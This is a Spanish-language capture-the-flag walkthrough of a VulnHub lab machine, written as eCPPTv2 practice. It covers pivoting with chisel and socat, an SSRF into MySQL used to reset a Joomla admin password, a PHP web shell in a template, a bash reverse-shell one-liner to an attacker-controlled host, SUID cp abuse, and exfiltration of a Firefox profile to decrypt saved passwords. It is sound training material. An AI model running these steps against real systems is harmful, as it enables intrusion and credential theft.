#ctf-machine #vulnhub #medium-machine #linux  #simulacion-eccptv2 [[Simulation eCPPTv2 Map.canvas|Simulation eCPPTv2 Map]]

## Pivoting
Nos encontramos conectados en la máquina anterior, la 192.168.159.147 (Aragog) por lo que si nos fijamos contiene dos interfaces de red:
![[Pasted image 20240829102535.png]]

Como vemos opera en un segmento de red en el cual no tenemos alcance. Por lo que primeramente haremos un escaneo de hosts para ver si hay algún host en ese segmento. Para hacerlo, he creado un pequeño script en "bash":
```bash
#!/bin/bash

for i in $(seq 1 254); do
	ping -c 1 10.10.0.$i -W 1 > /dev/null && echo "[i] Host descubierto: 10.10.0.$i" &
done; wait
```

Si lo ejecutamos vemos que hay un host ya que la ip "10.10.0.129" es la propia máquina:
![[Pasted image 20240829103414.png]]

Por lo que utilizamos `chisel` para poder crear con `proxychain` un túnel para poder llegar a ese segmento de red desde nuestra máquina local. Por lo que nos descargamos `chisel` en la máquina víctima con IP "192.168.158.147":
![[Pasted image 20240829103858.png]]

Una vez descargado ejecutamos `chisel` como servidor en nuestra máquina:
![[Pasted image 20240829104639.png]]

Y como cliente en la máquina "192.168.159.147":
![[Pasted image 20240829104620.png]]

Si nos fijamos se ha abierto un puerto en nuestra máquina, el puerto 1080 por el que podemos acceder con `proxychains` para alcanzar el segmento 10.10.0.0:
![[Pasted image 20240829104955.png]]

Por lo que lo añadimos a nuestra configuración de `proxychains` que se encuentra en `/etc/proxychains4`:
![[Pasted image 20240829105040.png]]

## Enumeración inicial
Una vez configurado el tunnel, ya podemos empezar con el reconocimiento inicial de la máquina.

Primeramente, lanzamos una traza ICMP con `ping` junto a `proxychains` para alcanzar la IP:
![[Pasted image 20240829105401.png]]

Como vemos el TTL=128 por lo que seguramente se trate de una máquina Windows ya que suelen tener ese valor de TTL.

### Nmap
Hacemos un primer escaneo con `nmap` para detectar los puertos TCP abiertos utilizando proxychains y el como `-sT` de `nmap`:
![[Pasted image 20240829110757.png]]

Como vemos solo hay 2 puertos abiertos en la máquina víctima por lo que realizamos un segundo escaneo para detectar la versión y servicio que corren para estos dos puertos:
![[Pasted image 20240829111018.png]]

Como vemos se trata de "OpenSSH 7.9p1" de "Debian" y "Apache httpd 2.4.38" también de "Debian" por lo que finalmente se trata de una máquina Linux.

## Enumeración web
Primeramente para poder ver la web en nuestro navegador, debemos añadir el proxy en nuestra extension `Foxyproxy`:
![[Pasted image 20240829111521.png]]

Una vez añadida, si activamos este *proxy* y accedemos a la "10.10.0.129", veremos la web. Si accedemos a la página principal vemos esto:
![[Pasted image 20240829111819.png]]

Como no hay nada interesante hacemos un escaneo con `gobuster` utilizando el *proxy* para alcanzar a la máquina víctima:
![[Pasted image 20240829113658.png]]

Como vemos hay un archivo `note.txt`, que si accedemos a él vemos lo siguiente:
![[Pasted image 20240829112940.png]]

Nos indica que está usando un nuevo servidor HTTP3.

Para poder operar con HTTP3, nos instalamos la herramienta `http3-client` que soporta HTTP3 utilizando este recurso:
https://github.com/cloudflare/quiche?tab=readme-ov-file#building

> [!NOTE] Debemos de cambiar al commit: `git checkout -b FixHTTP3 a22bb4b3cb474425764cb7d7b6abd112824994a2` para que `http3-client` funcione

Ahora hacemos un escaneo con `nmap` para corroborar que el puerto 443 por UDP de la máquina "10.10.0.129" está abierto:
![[Pasted image 20240829122741.png]]

Para tener acceso al puerto 443 de UDP que corresponde a HTTP3, debemos ejecutar el `chisel` de la máquina "192.168.159.147" de la siguiente forma:
![[Pasted image 20240829120607.png]]

Por lo que ahora el puerto 443 de UDP de nuestra máquina se convierte en el puerto 443 de UDP de la máquina "10.10.0.129". Si ejecutamos `http3-client` apuntando a nuestra máquina, vemos el contenido:
![[Pasted image 20240829132201.png]]

Como vemos, hay un archivo `/internalResourceFeTcher.php` en la web y además en el mensaje hace referencia a que no se ponga ningún archivo backup de configuración por lo que podemos buscar por dichos archivos.

Si accedemos al archivo mencionado en la web vemos lo siguiente:
![[Pasted image 20240829163645.png]]

Si utilizamos este campo para apuntar a un servicio interno de la máquina como el HTTP vemos que muestra su contenido:
![[Pasted image 20240829163824.png]]

Como la web interpreta PHP podemos intentar apuntar a un archivo PHP malicioso de nuestra máquina para ver si se interpreta:
![[Pasted image 20240829163931.png]]

Como la máquina víctima no tiene conexión directa con nuestra máquina debemos de utilizar `socat` en la máquina "192.168.159.147" para que todo el tráfico de un puerto suyo lo mande para nuestro puerto 80:
![[Pasted image 20240829165153.png]]

En este caso estamos redirigiendo todo el tráfico del puerto 4343 de la máquina "192.168.159.147" a nuestra máquina "192.168.159.131" por el puerto 80. Por lo que si proporcionamos un servidor con Python proporcionando un archivo "cmd.php" con este contenido:
```php
<?php system('whoami'); ?>
```
![[Pasted image 20240829165351.png]]

Y lanzamos una solicitud desde la web a "http://10.10.0.128:4343/cmd.php" (equivalente a la 192.168.159.147) redirigirá la solicitud a nuestro puerto 80.
![[Pasted image 20240829165752.png]]

Pero como vemos el código PHP no se interpreta:
![[Pasted image 20240829165744.png]]

Si hacemos un descubrimiento de archivos mediante `gobuster` en el directorio `joomla` descubierto anteriormente, vemos el siguiente archivo:
```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.0.129/joomla/" -x php,php.bak --proxy socks5://127.0.0.1:1080
```
![[Pasted image 20240829170112.png]]

Como decía la nota anterior, hay una archivo de *backup* por lo que nos lo podemos descargar desde el navegador y revisarlo:
![[Pasted image 20240829170402.png]]

Como vemos se trata de una base de datos MySQL con usuario "goblin" y sin contraseña. Por lo que podemos utilizar la herramienta `Gopherus` para generar links que permitan enumerar la base de datos mediante el SSRF.

Por lo que generamos un primer link para mostrar las bases de datos:
![[Pasted image 20240829171530.png]]
![[Pasted image 20240829171559.png]]

Ahora listamos las tablas de la base de datos "joomla":
![[Pasted image 20240829171711.png]]
![[Pasted image 20240829171743.png]]

Por lo que mostramos las columnas de la tabla "joomla_users":
![[Pasted image 20240829171909.png]]
![[Pasted image 20240829171950.png]]

Como vemos hay 3 columnas interesantes, las columnas "username", "email" y "password" por lo que mostramos sus contenidos:
![[Pasted image 20240829172126.png]]
![[Pasted image 20240829172214.png]]

Como vemos hay un *hash* del usuario "site_admin" por lo que en vez de *crackearlo* podemos modificar su contraseña. Primeramente creando un md5sum de "password":
![[Pasted image 20240829173306.png]]

Y seguidamente introducirlo en la base de datos:
![[Pasted image 20240829173420.png]]
![[Pasted image 20240829173438.png]]

Por lo que si ahora intentamos acceder a "Joomla" como administrador, tenemos acceso:
![[Pasted image 20240829173821.png]]

Una vez dentro, si queremos obtener RCE solo debemos de ir a "Templates" y seleccionar uno cualquiera:
![[Pasted image 20240829174103.png]]

Una vez seleccionado podemos modificar cualquier archivo PHP como el `error.php`:
![[Pasted image 20240829174151.png]]

Y añadirle código PHP malicioso:
![[Pasted image 20240829175018.png]]

Por lo que si ahora hacemos un `curl` con `proxychains` a http://10.10.0.129/joomla/templates/protostar/error.php?cmd=whoami, tenemos RCE:
![[Pasted image 20240829175210.png]]

Por lo que si ahora nos queremos entablar una *reverse shell* debemos de utilizar de nuevo `socat` en la máquina "192.168.159.147" para que el tráfico de red que llegue al puerto 4343 nuevamente lo mande al puerto 443 de nuestra máquina:
![[Pasted image 20240829175634.png]]

Por lo que si nos ponemos en escucha en nuestra máquina con `nc` por el puerto 443:
![[Pasted image 20240829175708.png]]

Y ejecutamos en la *web shell* el comando:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.0.128/4343 0>&1'
```

> [!NOTE] La 10.10.0.128 es la misma que la 192.168.159.147

Obtenemos la SHELL:
![[Pasted image 20240829180004.png]]

Por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240829180116.png]]![[Pasted image 20240829180228.png]]

## Escalada de privilegios
Si accedemos a `/var/www/html` podemos ver la primera *flag*:
![[Pasted image 20240829180352.png]]![[Pasted image 20240829180445.png]]

Si accedemos al directorio `/home/hermoine/bin` vemos un archivo SUID:
![[Pasted image 20240829180646.png]]

Este archivo es una copia del comando `cp`, pero con permisos SUID por lo que podemos utilizarlo para copiar una "authorized_keys" en el directorio ".ssh" del usuario "hermoine" para posteriormente conectarnos sin contraseña por SSH. Por lo que una vez creado el archivo "authorized_keys" en `/tmp`, lo copiamos:
![[Pasted image 20240829182208.png]]

Podemos conectarnos mediante SSH y `proxychains` para alcanzar la IP sin proporcionar contraseña:
![[Pasted image 20240829182356.png]]

Y ya podemos visualizar la segunda *flag*:
![[Pasted image 20240829182458.png]]
![[Pasted image 20240829182520.png]]

Si accedemos al directorio `/home/snape` vemos un archivo oculto llamado "creds.txt":
![[Pasted image 20240829182728.png]]

Que si accedemos a su contenido vemos unas credenciales en base64 por lo que podemos decodificarla:
![[Pasted image 20240829182810.png]]

Si probamos las credenciales para migrar al usuario "snape", son correctas:
![[Pasted image 20240829182921.png]]

Si nos fijamos en el directorio `/home/hermoine` hay un directorio ".mozilla" el cual puede contener contraseñas guardadas encriptadas:
![[Pasted image 20240829192304.png]]

Asi que volvemos al usuario "hermoine" para comprimir la carpeta y transferirla a nuestro equipo:
![[Pasted image 20240829192404.png]]

Ahora para transferir el comprimido a nuestro equipo podemos utilizar el `socat` abierto anteriormente para enviarle la data a la 10.10.0.128 (192.168.159.147) por el puerto 4343 para que lo redirja a nuestro puerto 443. Por lo que nos ponemos en escucha con `nc` y transferimos el archivo:
![[Pasted image 20240829193045.png]]
![[Pasted image 20240829193055.png]]
![[Pasted image 20240829193123.png]]

 Y como vemos la data no ha sido modificada:
 ![[Pasted image 20240829193142.png]]
 ![[Pasted image 20240829193154.png]]

Por lo que ahora podemos utilizar la herramienta `firefox-decrypt` para desencriptar las posibles contraseñas:
https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
![[Pasted image 20240829193419.png]]
![[Pasted image 20240829193408.png]]

Y como vemos podemos extraer la contraseña:
![[Pasted image 20240829193336.png]]

Que podemos utilizar para migrar al usuario *root*:
![[Pasted image 20240829193528.png]]

Y visualizar la última *flag* en `/root`:
![[Pasted image 20240829193716.png]]

___
#ssrf #abusing-suid #information-leakage #joomla #hash-cracking 
___